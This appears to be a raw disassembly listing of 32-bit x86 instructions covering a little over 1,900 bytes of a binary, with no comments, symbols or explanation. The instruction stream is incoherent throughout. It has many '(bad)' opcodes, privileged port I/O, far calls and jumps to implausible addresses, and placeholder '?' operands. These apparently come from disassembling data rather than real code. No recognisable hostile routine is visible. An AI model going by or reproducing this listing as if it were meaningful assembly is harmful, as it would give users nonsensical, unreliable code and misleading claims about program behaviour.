  41ba3d:	neg    al
  41ba3f:	or     al,0x1b
  41ba41:	inc    ebx
  41ba42:	mov    BYTE PTR [esi+0x7ac90f62],dl
  41ba48:	(bad)  
  41ba49:	jle    0x41ba9b
  41ba4b:	and    ebp,ebx
  41ba4d:	xor    DWORD PTR [ebx+0x268893c1],0xffffffa6
  41ba54:	jb     0x41b9dc
  41ba56:	push   esp
  41ba57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba58:	shl    bl,0x6f
  41ba5b:	aas    
  41ba5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba5d:	xor    bh,BYTE PTR [ebp+0x12]
  41ba60:	sub    DWORD PTR [ebx-0x35],ecx
  41ba63:	cdq    
  41ba64:	and    DWORD PTR [esi-0x37],esp
  41ba67:	pushf  
  41ba68:	call   0x62ba:0x202da2d8
  41ba6f:	shl    ebp,1
  41ba71:	inc    ecx
  41ba72:	les    edi,FWORD PTR ds:0xfb065e08
  41ba78:	xor    cl,dh
  41ba7a:	xchg   ebp,eax
  41ba7b:	xor    BYTE PTR [esi],0xd2
  41ba7e:	and    bh,dh
  41ba80:	cdq    
  41ba81:	pop    ebx
  41ba82:	add    eax,0x4b0ef570
  41ba87:	std    
  41ba88:	xor    DWORD PTR [ebx-0x45a58d61],esi
  41ba8e:	test   DWORD PTR [ebx+0x48266aab],0x8fca11b8
  41ba98:	cmp    BYTE PTR [eax+0x2d],0x18
  41ba9c:	cdq    
  41ba9d:	dec    edi
  41ba9e:	push   esi
  41ba9f:	push   edi
  41baa0:	scas   eax,DWORD PTR es:[edi]
  41baa1:	push   ecx
  41baa2:	pop    eax
  41baa3:	dec    edx
  41baa4:	push   esi
  41baa5:	retf   
  41baa6:	or     DWORD PTR [eax],eax
  41baa8:	sbb    BYTE PTR [edi],dl
  41baaa:	push   esi
  41baab:	ds dec edx
  41baad:	cwde   
  41baae:	sbb    bh,bh
  41bab0:	push   esp
  41bab1:	mov    DWORD PTR [esi],eax
  41bab3:	lock xchg ebx,eax
  41bab5:	jnp    0x41ba6d
  41bab7:	jnp    0x41bad6
  41bab9:	lahf   
  41baba:	and    al,dl
  41babc:	out    dx,al
  41babd:	mov    WORD PTR [ecx-0x15],cs
  41bac0:	daa    
  41bac1:	sbb    eax,0xee2267a2
  41bac6:	add    DWORD PTR [esi-0x16b39cd0],eax
  41bacc:	adc    DWORD PTR gs:[esi],edi
  41bacf:	adc    al,0x47
  41bad1:	std    
  41bad2:	mov    ?,ebx
  41bad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bad6:	dec    eax
  41bad7:	pop    ds
  41bad8:	inc    edi
  41bad9:	sbb    dh,BYTE PTR [ebx-0x56]
  41badc:	adc    BYTE PTR [eax+0x7b],cl
  41badf:	sub    eax,0xcd39d150
  41bae4:	pop    eax
  41bae5:	cmp    ecx,ebp
  41bae7:	idiv   BYTE PTR [ebp+0x782136db]
  41baed:	cs xor eax,0x9b3e4852
  41baf3:	cmc    
  41baf4:	pop    es
  41baf5:	mov    BYTE PTR ds:0xbc2fdabe,cl
  41bafb:	shrd   DWORD PTR [ebp+0x7e],edx,cl
  41baff:	sar    BYTE PTR [ecx+0x3c],1
  41bb02:	mov    edi,0xe4885744
  41bb07:	jmp    0xdc76235c
  41bb0c:	mov    ebp,0xc3acafd
  41bb11:	sbb    DWORD PTR [edi],ecx
  41bb13:	xor    DWORD PTR [edx+0x10],ebp
  41bb16:	daa    
  41bb17:	jmp    0xa97e:0xf1e2d75b
  41bb1e:	sub    ecx,edx
  41bb20:	push   ecx
  41bb21:	jnp    0x41bb75
  41bb23:	sub    dl,ah
  41bb25:	ds scas eax,DWORD PTR es:[edi]
  41bb27:	xchg   esi,eax
  41bb28:	sub    edx,0xffffffb8
  41bb2b:	aad    0x6c
  41bb2d:	mov    cl,0xa9
  41bb2f:	push   eax
  41bb30:	lea    ebp,[edx]
  41bb32:	dec    esi
  41bb33:	adc    DWORD PTR [eax],ebx
  41bb35:	mov    ebx,0x8632bc3e
  41bb3a:	ret    0xab22
  41bb3d:	jbe    0x41bb59
  41bb3f:	mov    ?,WORD PTR [edx]
  41bb41:	jne    0x41bb3c
  41bb43:	push   edi
  41bb44:	dec    eax
  41bb45:	retf   0x48dd
  41bb48:	and    al,0xf2
  41bb4a:	mov    WORD PTR [eax+0x175b365d],?
  41bb50:	in     al,dx
  41bb51:	sub    edi,eax
  41bb53:	add    ecx,DWORD PTR [edx-0x52606577]
  41bb59:	push   esi
  41bb5a:	inc    ecx
  41bb5b:	sahf   
  41bb5c:	xchg   ecx,eax
  41bb5d:	fs sbb al,0x0
  41bb60:	pop    esi
  41bb61:	enter  0xf5f1,0xb7
  41bb65:	lods   al,BYTE PTR ds:[esi]
  41bb66:	stos   BYTE PTR es:[edi],al
  41bb67:	and    esp,edx
  41bb69:	repnz mov edi,0x147670b
  41bb6f:	mov    bl,0x0
  41bb71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb72:	push   edx
  41bb73:	adc    al,BYTE PTR [edx-0x71]
  41bb76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb77:	jnp    0x41bb3c
  41bb79:	xor    DWORD PTR [ebx+ebp*1],edi
  41bb7c:	jae    0x41bb3d
  41bb7e:	xchg   ebp,edx
  41bb80:	pop    esp
  41bb81:	call   0x6663e6b1
  41bb86:	cmp    bh,0x22
  41bb89:	dec    edx
  41bb8a:	div    DWORD PTR [edx]
  41bb8c:	scas   al,BYTE PTR es:[edi]
  41bb8d:	addr16 inc edi
  41bb8f:	xchg   ebp,eax
  41bb90:	fsubp  st(2),st
  41bb92:	fimul  WORD PTR [ebx+0x2c818a9b]
  41bb98:	cs push edi
  41bb9a:	add    esp,DWORD PTR [esi]
  41bb9c:	and    DWORD PTR ds:0xd1809dc0,esp
  41bba2:	call   0x5369:0x4beb8c94
  41bba9:	xlat   BYTE PTR ds:[ebx]
  41bbaa:	dec    esi
  41bbab:	xchg   esp,eax
  41bbac:	add    ch,BYTE PTR ds:0xa29a2f80
  41bbb2:	add    eax,0xd0ffda5b
  41bbb7:	jle    0x41bc07
  41bbb9:	cmp    eax,0x56ba4fca
  41bbbe:	popf   
  41bbbf:	enter  0xb03e,0xb0
  41bbc3:	aam    0x48
  41bbc5:	cdq    
  41bbc6:	push   ebp
  41bbc7:	addr16 push ecx
  41bbc9:	or     ebp,DWORD PTR [eax]
  41bbcb:	arpl   WORD PTR [ebx+0x2280e60c],bx
  41bbd1:	add    al,0xda
  41bbd3:	test   DWORD PTR [eax+0x2dd9de4a],ebx
  41bbd9:	jmp    FWORD PTR [edi]
  41bbdb:	in     eax,0x8d
  41bbdd:	dec    eax
  41bbde:	ds cmc 
  41bbe0:	sar    edx,0x9f
  41bbe3:	lock inc esp
  41bbe5:	adc    eax,0x3b79d074
  41bbea:	jle    0x41bbac
  41bbec:	jnp    0x41bc54
  41bbee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbef:	or     al,0x2b
  41bbf1:	xchg   ecx,eax
  41bbf2:	jne    0x41bc64
  41bbf4:	dec    edx
  41bbf5:	ins    DWORD PTR es:[edi],dx
  41bbf6:	mov    DWORD PTR [esi+0x5f79d296],esp
  41bbfc:	push   ds
  41bbfd:	(bad)  [edi]
  41bbff:	jmp    0xc643:0x6839305
  41bc06:	in     al,0xf7
  41bc08:	lahf   
  41bc09:	pop    esp
  41bc0a:	stc    
  41bc0b:	repz jns 0x41bbc3
  41bc0e:	enter  0x9c83,0xbe
  41bc12:	mov    eax,0xff94f213
  41bc17:	(bad)  
  41bc18:	leave  
  41bc19:	xor    DWORD PTR [ebx+0x31],ecx
  41bc1c:	lods   al,BYTE PTR ds:[esi]
  41bc1d:	(bad)  
  41bc1e:	dec    ebp
  41bc1f:	scas   eax,DWORD PTR es:[edi]
  41bc20:	and    esi,ebx
  41bc22:	sbb    BYTE PTR [edx+0x53],cl
  41bc25:	lods   eax,DWORD PTR ds:[esi]
  41bc26:	das    
  41bc27:	add    BYTE PTR [esi+0x57c74bcb],bl
  41bc2d:	das    
  41bc2e:	cmp    ebx,DWORD PTR [edx-0x7]
  41bc31:	adc    dh,BYTE PTR [eax]
  41bc33:	fnstcw WORD PTR ds:0x7d265240
  41bc39:	rol    esp,1
  41bc3b:	(bad)  
  41bc3c:	out    dx,al
  41bc3d:	xchg   esi,eax
  41bc3e:	ja     0x41bc63
  41bc40:	pop    ebp
  41bc41:	call   0x85b8:0x847d75e0
  41bc48:	push   ebx
  41bc49:	hlt    
  41bc4a:	sub    eax,0xfeb42aa
  41bc4f:	dec    DWORD PTR [eax+edx*1-0x457e9b1d]
  41bc56:	rol    al,cl
  41bc58:	fist   WORD PTR [ecx-0x6fbaaabc]
  41bc5e:	dec    ebp
  41bc5f:	shl    DWORD PTR [edx-0x5f],1
  41bc62:	test   eax,0xd2d70e82
  41bc67:	and    BYTE PTR [edx],dh
  41bc69:	cwde   
  41bc6a:	add    eax,0x37a4963b
  41bc6f:	adc    DWORD PTR [eax+0x3238ae25],edi
  41bc75:	xchg   edx,eax
  41bc76:	cmp    al,0x87
  41bc78:	and    ah,BYTE PTR [ecx+edi*4-0x2bc1e15e]
  41bc7f:	dec    ebx
  41bc80:	pop    ecx
  41bc81:	xchg   esi,eax
  41bc82:	fnstenv [eax+0x3ae007d]
  41bc88:	inc    eax
  41bc89:	cmp    eax,0xd0f7158a
  41bc8e:	test   cl,bl
  41bc90:	jmp    DWORD PTR [ecx]
  41bc92:	fs push esp
  41bc94:	jb     0x41bc61
  41bc96:	xchg   ebx,eax
  41bc97:	mov    ebp,0x37c411ef
  41bc9c:	out    dx,al
  41bc9d:	jo     0x41bcce
  41bc9f:	mov    ecx,0x4e827ade
  41bca4:	aad    0xaf
  41bca6:	adc    eax,0xee027fda
  41bcab:	jmp    0x3672:0x9236a69c
  41bcb2:	mov    ds:0xa0b26893,al
  41bcb7:	cmp    eax,0x75b55b5d
  41bcbc:	popa   
  41bcbd:	ror    DWORD PTR ds:0xdb07acc4,1
  41bcc3:	dec    esi
  41bcc4:	cdq    
  41bcc5:	pop    ss
  41bcc6:	cmp    ax,0x9c8b
  41bcca:	dec    esi
  41bccb:	and    esp,DWORD PTR [edi-0x17cbe8e]
  41bcd1:	push   eax
  41bcd2:	push   edx
  41bcd3:	mov    ecx,0xe01b510d
  41bcd8:	xchg   ebp,eax
  41bcd9:	xchg   BYTE PTR [edi],al
  41bcdb:	add    ebp,esi
  41bcdd:	nop
  41bcde:	enter  0x6956,0x16
  41bce2:	jge    0x41bcb4
  41bce4:	adc    esp,DWORD PTR [ecx-0x2c71cf7c]
  41bcea:	pop    eax
  41bceb:	xor    DWORD PTR [ebx-0x420c8bb4],ebp
  41bcf1:	int3   
  41bcf2:	dec    esi
  41bcf3:	pusha  
  41bcf4:	mov    DWORD PTR [ecx+ebx*2],edx
  41bcf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcf8:	mov    DWORD PTR [esi],ebx
  41bcfa:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41bcfc:	inc    ecx
  41bcfd:	aad    0xca
  41bcff:	push   esi
  41bd00:	(bad)  
  41bd01:	ror    DWORD PTR es:[ebp+0x53],cl
  41bd05:	je     0x41bcdd
  41bd07:	aam    0xd5
  41bd09:	and    bl,bl
  41bd0b:	(bad)  
  41bd0c:	cmp    bh,BYTE PTR [edi+0x284198c5]
  41bd12:	repz mov edi,ebp
  41bd15:	lods   al,BYTE PTR ds:[esi]
  41bd16:	mov    cl,BYTE PTR [eax]
  41bd18:	mov    ds:0x699fe59,eax
  41bd1d:	outs   dx,DWORD PTR ds:[esi]
  41bd1e:	lods   eax,DWORD PTR ds:[esi]
  41bd1f:	and    bh,BYTE PTR [edx+0x64]
  41bd22:	xchg   ebp,eax
  41bd23:	push   esi
  41bd24:	jnp    0x41bce7
  41bd26:	mov    edx,0x1e59a54b
  41bd2b:	iret   
  41bd2c:	and    al,0x46
  41bd2e:	repz ret 
  41bd30:	int3   
  41bd31:	outs   dx,BYTE PTR ds:[esi]
  41bd32:	out    0x83,eax
  41bd34:	scas   eax,DWORD PTR es:[edi]
  41bd35:	faddp  st(2),st
  41bd37:	jne    0x41bd9b
  41bd39:	xchg   DWORD PTR [edi-0x44503a02],esp
  41bd3f:	iret   
  41bd40:	fmul   QWORD PTR [ebp+0x330e60d]
  41bd46:	scas   eax,DWORD PTR es:[edi]
  41bd47:	out    0xaf,al
  41bd49:	test   esi,ebp
  41bd4b:	outs   dx,DWORD PTR ds:[esi]
  41bd4c:	push   ebp
  41bd4d:	or     al,0x21
  41bd4f:	cmp    DWORD PTR [ebp-0x53cc2d0e],0x41b4e5a2
  41bd59:	mov    ebp,0x3d881536
  41bd5e:	loopne 0x41bd42
  41bd60:	push   es
  41bd61:	push   edi
  41bd62:	les    ebp,FWORD PTR [esi+0xe]
  41bd65:	xchg   esp,eax
  41bd66:	lds    ebp,FWORD PTR cs:[edx]
  41bd69:	jmp    0x41bdae
  41bd6b:	sahf   
  41bd6c:	cmp    DWORD PTR [ebp+0x33],0x77
  41bd70:	out    dx,eax
  41bd71:	repz mov bh,0x17
  41bd74:	leave  
  41bd75:	dec    ebx
  41bd76:	pop    eax
  41bd77:	leave  
  41bd78:	and    DWORD PTR [edx-0x18],ecx
  41bd7b:	hlt    
  41bd7c:	mov    al,ds:0x771086f3
  41bd81:	xchg   DWORD PTR [ebx+0x4a291768],ebx
  41bd87:	pop    esi
  41bd88:	mov    dh,0xe8
  41bd8a:	fwait
  41bd8b:	dec    ecx
  41bd8c:	mov    eax,DWORD PTR [esi+0x51]
  41bd8f:	lahf   
  41bd90:	or     eax,DWORD PTR [ebx]
  41bd92:	jb     0x41be03
  41bd94:	in     al,dx
  41bd95:	jnp    0x41bd31
  41bd97:	cs mov edi,0x83f32c26
  41bd9d:	(bad)  
  41bd9e:	ror    BYTE PTR [edi+0x7213c74],0xa8
  41bda5:	jae    0x41bd38
  41bda7:	pop    esp
  41bda8:	mov    edx,0xfa8cea06
  41bdad:	add    al,0x27
  41bdaf:	rcr    BYTE PTR [eax+0x2082af1a],cl
  41bdb5:	mov    ecx,0xe594ba60
  41bdba:	sub    DWORD PTR [edi+0x1cabeb89],0xffffff81
  41bdc1:	cdq    
  41bdc2:	pop    ebp
  41bdc3:	xchg   edi,eax
  41bdc4:	and    eax,0x105f8a35
  41bdc9:	icebp  
  41bdca:	inc    edi
  41bdcb:	jp     0x41bde8
  41bdcd:	repnz clc 
  41bdcf:	cs call 0x2f4c1fbf
  41bdd5:	mov    ds:0xe8b784fd,eax
  41bdda:	lds    esi,FWORD PTR [ecx-0x6b]
  41bddd:	pop    ecx
  41bdde:	xor    ch,0x83
  41bde1:	add    DWORD PTR [esi-0x21fb6262],esp
  41bde7:	sub    DWORD PTR [ebx-0x7d439acf],ebp
  41bded:	jbe    0x41be31
  41bdef:	cld    
  41bdf0:	mov    ebx,0x475d28c2
  41bdf5:	sbb    DWORD PTR [edi+0x45fc3392],ebx
  41bdfb:	repz mov eax,0x3d45e26b
  41be01:	fstp   QWORD PTR [ebx-0xcedb3e9]
  41be07:	xor    al,0xee
  41be09:	sti    
  41be0a:	add    al,0x6
  41be0c:	dec    esp
  41be0d:	dec    esi
  41be0e:	or     cl,0xaf
  41be11:	cli    
  41be12:	jb     0x41bdbd
  41be14:	pop    ss
  41be15:	daa    
  41be16:	outs   dx,BYTE PTR ds:[esi]
  41be17:	sub    eax,0xe9f271fb
  41be1c:	out    0xd,eax
  41be1e:	and    eax,0x54cdea54
  41be23:	jecxz  0x41be98
  41be25:	into   
  41be26:	mov    edi,0xe3de0372
  41be2b:	dec    ecx
  41be2c:	inc    edi
  41be2d:	je     0x41be07
  41be2f:	pop    ss
  41be30:	mov    ecx,esp
  41be32:	push   cs
  41be33:	icebp  
  41be34:	ins    BYTE PTR es:[edi],dx
  41be35:	push   0x89a40957
  41be3a:	mov    ch,0x2e
  41be3c:	sahf   
  41be3d:	jle    0x41be04
  41be3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be40:	adc    al,BYTE PTR [ebx+ebx*8+0x4ba93ab0]
  41be47:	push   ecx
  41be48:	mov    ch,0xa2
  41be4a:	inc    eax
  41be4b:	loopne 0x41be18
  41be4d:	fstp   st(5)
  41be4f:	or     al,BYTE PTR [edi+0x3e]
  41be52:	and    eax,0xdf564e6
  41be57:	sbb    al,BYTE PTR [edi-0x16]
  41be5a:	inc    edi
  41be5b:	sbb    BYTE PTR [edi+0x56],ah
  41be5e:	inc    dh
  41be60:	stos   DWORD PTR es:[edi],eax
  41be61:	add    ch,BYTE PTR [esi-0x16426456]
  41be67:	xchg   DWORD PTR [edi],ebx
  41be69:	sahf   
  41be6a:	push   cs
  41be6b:	nop
  41be6c:	ret    0x821
  41be6f:	push   ds
  41be70:	mov    dl,0xe7
  41be72:	push   esi
  41be73:	dec    ecx
  41be74:	popa   
  41be75:	(bad)  
  41be76:	out    dx,eax
  41be77:	jns    0x41be3d
  41be79:	or     cl,cl
  41be7b:	aam    0x69
  41be7d:	pop    edx
  41be7e:	daa    
  41be7f:	je     0x41be2f
  41be81:	nop
  41be82:	mov    cs,WORD PTR [edx-0x4c]
  41be85:	clc    
  41be86:	cmp    BYTE PTR [edx*8-0x6de9f331],ch
  41be8d:	inc    esi
  41be8e:	and    BYTE PTR [eax+ebx*4+0x3a],dl
  41be92:	imul   di,WORD PTR [eax],0x58
  41be96:	or     bh,ah
  41be98:	nop
  41be99:	repnz mov cl,0x7a
  41be9c:	xchg   BYTE PTR [ebp+0x1f2a79ca],al
  41bea2:	iret   
  41bea3:	out    0xf7,eax
  41bea5:	pusha  
  41bea6:	retf   0xc0c6
  41bea9:	push   0xb2c9e2c7
  41beae:	or     eax,0x8efcb8cf
  41beb3:	popa   
  41beb4:	sahf   
  41beb5:	xchg   esp,eax
  41beb6:	daa    
  41beb7:	(bad)  
  41beb8:	adc    DWORD PTR [edi-0x5b],edx
  41bebb:	or     esp,DWORD PTR [ebp+0x5c]
  41bebe:	pop    ecx
  41bebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bec0:	fs adc eax,0x28d20b3a
  41bec6:	(bad)  
  41bec7:	push   0x7a
  41bec9:	xor    ecx,DWORD PTR [ecx-0x49]
  41becc:	mov    eax,ds:0xddaa2569
  41bed1:	push   0x82e344e3
  41bed6:	(bad)  
  41bed7:	xlat   BYTE PTR ds:[ebx]
  41bed8:	fimul  WORD PTR ds:0x7f54c5be
  41bede:	add    al,0xa
  41bee0:	and    edi,DWORD PTR [edi]
  41bee2:	test   BYTE PTR [edi+0x39],0x5
  41bee6:	adc    BYTE PTR [ebp-0x41],dl
  41bee9:	out    dx,eax
  41beea:	sbb    eax,0x868134c5
  41beef:	pop    ds
  41bef0:	sub    ah,BYTE PTR [edx+0xa4c4b40]
  41bef6:	fsub   QWORD PTR [ecx+0x37edc56a]
  41befc:	jmp    0x367723d5
  41bf01:	and    eax,eax
  41bf03:	mov    dl,0xea
  41bf05:	repz xchg esp,eax
  41bf07:	lahf   
  41bf08:	ficomp WORD PTR ds:0x68f49a19
  41bf0e:	ret    
  41bf0f:	mov    esi,0x1cbefe8f
  41bf14:	shr    DWORD PTR [ecx+0x32ef7b21],1
  41bf1a:	xchg   esp,eax
  41bf1b:	std    
  41bf1c:	push   0xffffff85
  41bf1e:	dec    ecx
  41bf1f:	xor    DWORD PTR [esi-0x68335118],edx
  41bf25:	adc    eax,0xbb763996
  41bf2a:	xchg   edi,eax
  41bf2b:	rol    ebx,cl
  41bf2d:	imul   esi,DWORD PTR [ebx],0xffffffd4
  41bf30:	lods   eax,DWORD PTR ds:[esi]
  41bf31:	daa    
  41bf32:	cli    
  41bf33:	inc    esi
  41bf34:	cdq    
  41bf35:	shl    BYTE PTR [ebx],1
  41bf37:	ss int3 
  41bf39:	inc    ebp
  41bf3a:	lahf   
  41bf3b:	repz sub al,0x8f
  41bf3e:	fld    DWORD PTR [esi+0x15808358]
  41bf44:	retf   
  41bf45:	ins    BYTE PTR es:[edi],dx
  41bf46:	fstp   DWORD PTR [ecx+0x2]
  41bf49:	push   es
  41bf4a:	test   al,0x33
  41bf4c:	pop    es
  41bf4d:	push   DWORD PTR [esi-0x7c]
  41bf50:	sbb    dx,dx
  41bf53:	stc    
  41bf54:	sub    BYTE PTR [edx-0x42],dl
  41bf57:	(bad)  
  41bf58:	jmp    0xbd5b2d9
  41bf5d:	aam    0x30
  41bf5f:	les    ebp,FWORD PTR [ecx-0x2f]
  41bf62:	js     0x41bf91
  41bf64:	ret    0x7761
  41bf67:	push   eax
  41bf68:	sbb    al,0xc4
  41bf6a:	adc    esi,eax
  41bf6c:	hlt    
  41bf6d:	pop    ds
  41bf6e:	retf   
  41bf6f:	lods   eax,DWORD PTR ds:[esi]
  41bf70:	call   0xb75e4357
  41bf75:	test   DWORD PTR [eax-0x6c],ebp
  41bf78:	xchg   esi,eax
  41bf79:	aas    
  41bf7a:	pop    eax
  41bf7b:	sub    bl,al
  41bf7d:	sub    ebp,DWORD PTR [edx+eiz*8]
  41bf80:	ror    BYTE PTR [ebx+0x76f207e6],cl
  41bf86:	or     al,0x20
  41bf88:	retf   0x8203
  41bf8b:	pusha  
  41bf8c:	enter  0x31e0,0x25
  41bf90:	popf   
  41bf91:	test   eax,0xd3412aa6
  41bf96:	and    BYTE PTR [eax-0x7e08bc9b],ah
  41bf9c:	test   al,0x2c
  41bf9e:	mov    al,ds:0x14dfdd7d
  41bfa3:	push   ebp
  41bfa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfa5:	loop   0x41bf84
  41bfa7:	fistp  DWORD PTR [edx+0x53b9de5e]
  41bfad:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41bfaf:	and    ecx,DWORD PTR [eax+0x2]
  41bfb2:	push   0x19
  41bfb4:	cmp    DWORD PTR [edx],esp
  41bfb6:	cmp    ecx,DWORD PTR gs:[esi-0x70]
  41bfba:	lds    ecx,FWORD PTR [ecx+0x41]
  41bfbd:	cwde   
  41bfbe:	int    0xee
  41bfc0:	mov    ds:0xd58d5b01,al
  41bfc5:	rcr    BYTE PTR [ecx+ecx*4+0x5cc249bd],cl
  41bfcc:	push   cs
  41bfcd:	mov    ds:0x77856f0c,al
  41bfd2:	imul   esp,DWORD PTR [edx],0x4e6766fd
  41bfd8:	test   al,0xc3
  41bfda:	jge    0x41c03a
  41bfdc:	loop   0x41bf82
  41bfde:	inc    esi
  41bfdf:	adc    al,0xeb
  41bfe1:	fbld   TBYTE PTR [ebp+ebx*2+0x4eb1eea7]
  41bfe8:	loopne 0x41bfa4
  41bfea:	add    dl,ah
  41bfec:	mov    esp,0x8c96200f
  41bff1:	xchg   ecx,eax
  41bff2:	shl    ah,0x7b
  41bff5:	and    DWORD PTR [edx-0x7a],eax
  41bff8:	sub    ah,BYTE PTR [eax-0xd7b3146]
  41bffe:	add    DWORD PTR [edx+edx*8-0x3afd3f77],0x3fbbfc3d
  41c009:	jge    0x41c01c
  41c00b:	add    DWORD PTR [esi+0xe],ebp
  41c00e:	(bad)  
  41c010:	inc    ebx
  41c011:	ja     0x41c077
  41c013:	mov    esi,0xa7dfed78
  41c018:	(bad)  
  41c019:	push   ebx
  41c01a:	das    
  41c01b:	pop    eax
  41c01c:	push   ebp
  41c01d:	add    DWORD PTR [edx+0x6a],esi
  41c020:	jne    0x41bfc7
  41c022:	xlat   BYTE PTR ds:[ebx]
  41c023:	mov    edx,0x838a585a
  41c028:	push   es
  41c029:	stos   BYTE PTR es:[edi],al
  41c02a:	xor    DWORD PTR [edi-0x52],ebx
  41c02d:	rcl    BYTE PTR ds:0x3c102505,cl
  41c033:	jb     0x41c02b
  41c035:	neg    BYTE PTR [ebx-0x58b5a36a]
  41c03b:	daa    
  41c03c:	sbb    BYTE PTR [edx],dl
  41c03e:	push   0x98d8ac77
  41c043:	in     eax,0xb7
  41c045:	cmp    DWORD PTR [esi],0x7a444a85
  41c04b:	pop    esp
  41c04c:	ror    BYTE PTR [ebx],0x22
  41c04f:	or     eax,0x9918c99b
  41c054:	inc    esp
  41c055:	not    al
  41c057:	or     DWORD PTR [ecx-0x68b287a4],0x35da261f
  41c061:	fld    QWORD PTR [ebp+0x10127e6b]
  41c067:	push   es
  41c068:	ins    DWORD PTR es:[edi],dx
  41c069:	push   0x6b
  41c06b:	or     eax,0x6fed2c7d
  41c070:	mov    ebx,0x2f4d043f
  41c075:	les    edi,FWORD PTR [edi+0x2dd279e4]
  41c07b:	add    DWORD PTR [edx-0x80],esi
  41c07e:	push   ecx
  41c07f:	test   DWORD PTR [ebp+0x79],esi
  41c082:	int3   
  41c083:	pushf  
  41c084:	cmc    
  41c085:	mov    al,0x72
  41c087:	mov    dh,0x34
  41c089:	into   
  41c08a:	xlat   BYTE PTR ds:[ebx]
  41c08b:	inc    ebx
  41c08c:	jge    0x41c066
  41c08e:	cmp    DWORD PTR [ecx],edi
  41c090:	and    eax,0x17c58d22
  41c095:	inc    ecx
  41c096:	mov    eax,0x2df558e2
  41c09b:	adc    cl,bl
  41c09d:	data16 outs dx,BYTE PTR ds:[esi]
  41c09f:	jb     0x41c07f
  41c0a1:	sub    al,0x67
  41c0a3:	xor    bl,dl
  41c0a5:	mov    edx,0xae2a45a0
  41c0aa:	into   
  41c0ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0ac:	jb     0x41c0df
  41c0ae:	mov    ah,bl
  41c0b0:	inc    bx
  41c0b2:	xor    edi,DWORD PTR [edi+0x37fe8c76]
  41c0b8:	inc    ebx
  41c0b9:	cmp    esp,esi
  41c0bb:	adc    edi,DWORD PTR cs:[eax-0xb890ace]
  41c0c2:	lods   al,BYTE PTR ds:[esi]
  41c0c3:	pop    esp
  41c0c4:	lods   eax,DWORD PTR ds:[esi]
  41c0c5:	(bad)  
  41c0c6:	xchg   BYTE PTR [edi+0x56],bh
  41c0c9:	and    al,0x79
  41c0cb:	add    BYTE PTR [ecx+0x34],bh
  41c0ce:	lds    ecx,FWORD PTR [ecx+0x4f]
  41c0d1:	jbe    0x41c140
  41c0d3:	sbb    cl,BYTE PTR [edx+0x60]
  41c0d6:	mov    bl,0xeb
  41c0d8:	mov    edi,0x8c96967c
  41c0dd:	inc    eax
  41c0de:	jl     0x41c0d9
  41c0e0:	(bad)  
  41c0e1:	call   0x1e8b:0x2b40cc45
  41c0e8:	sub    eax,eax
  41c0ea:	ja     0x41c0f8
  41c0ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0ed:	popf   
  41c0ee:	dec    ebx
  41c0ef:	push   esp
  41c0f0:	inc    edx
  41c0f1:	gs cs jge 0x41c0da
  41c0f5:	jno    0x41c163
  41c0f7:	in     eax,0x16
  41c0f9:	mov    ecx,0xe71bea5a
  41c0fe:	je     0x41c155
  41c100:	dec    edi
  41c101:	lahf   
  41c102:	xchg   edi,eax
  41c103:	jecxz  0x41c131
  41c105:	and    eax,0x7e89087
  41c10a:	xchg   esp,eax
  41c10b:	xor    ecx,edx
  41c10d:	loopne 0x41c16b
  41c10f:	mov    WORD PTR [ecx+0x42116ccd],?
  41c115:	fld    st(4)
  41c117:	cmp    eax,0xa0e08287
  41c11c:	aaa    
  41c11d:	inc    esi
  41c11e:	jecxz  0x41c0f1
  41c120:	add    ch,BYTE PTR [eax-0x52]
  41c123:	and    eax,0xc371c91a
  41c128:	cld    
  41c129:	in     al,0x64
  41c12b:	lods   al,BYTE PTR ds:[esi]
  41c12c:	or     edx,DWORD PTR [esi+0x5e]
  41c12f:	jnp    0x41c167
  41c131:	aas    
  41c132:	add    eax,0x78fbf71e
  41c137:	(bad)  
  41c138:	int3   
  41c139:	pop    ecx
  41c13b:	cmp    edi,DWORD PTR [ebp+0x2e]
  41c13e:	ins    BYTE PTR es:[edi],dx
  41c13f:	or     ch,dh
  41c141:	and    BYTE PTR [eax+edx*2],bh
  41c144:	loop   0x41c0f1
  41c146:	(bad)  
  41c147:	fs loopne 0x41c108
  41c14a:	and    DWORD PTR [ebp+0x6e],0x5f
  41c14e:	inc    edi
  41c14f:	out    0x63,al
  41c151:	mov    cs:0x24033808,eax
  41c157:	cmp    edi,0xb00e4493
  41c15d:	sbb    ch,BYTE PTR [edx]
  41c15f:	das    
  41c160:	fcom   DWORD PTR [edx]
  41c162:	aaa    
  41c163:	scas   eax,DWORD PTR es:[edi]
  41c164:	js     0x41c1bf
  41c166:	leave  
  41c167:	dec    edx
  41c168:	lods   eax,DWORD PTR ds:[esi]
  41c169:	scas   eax,DWORD PTR es:[edi]
  41c16a:	push   esi
  41c16b:	out    0x99,al
  41c16d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c16e:	mov    ebx,DWORD PTR [edi-0x67]
  41c171:	mov    ecx,0x2ae38110
  41c176:	xor    al,0xea
  41c178:	in     al,0x90
  41c17a:	clc    
  41c17b:	pushf  
  41c17c:	sub    ecx,0xb6993be5
  41c182:	inc    edi
  41c183:	xchg   esi,eax
  41c184:	xor    edi,DWORD PTR [ecx]
  41c186:	lods   eax,DWORD PTR ds:[esi]
  41c187:	mov    ebp,0x580a0da3
  41c18c:	sub    bl,BYTE PTR [edx-0x7b]
  41c18f:	mov    esp,DWORD PTR fs:[eax-0x58ad495c]
  41c196:	rcl    ebp,0x38
  41c199:	shl    BYTE PTR [ebx],cl
  41c19b:	adc    eax,esp
  41c19d:	lahf   
  41c19e:	arpl   WORD PTR [eax+0x671f74a0],si
  41c1a4:	int3   
  41c1a5:	adc    al,BYTE PTR [esi]
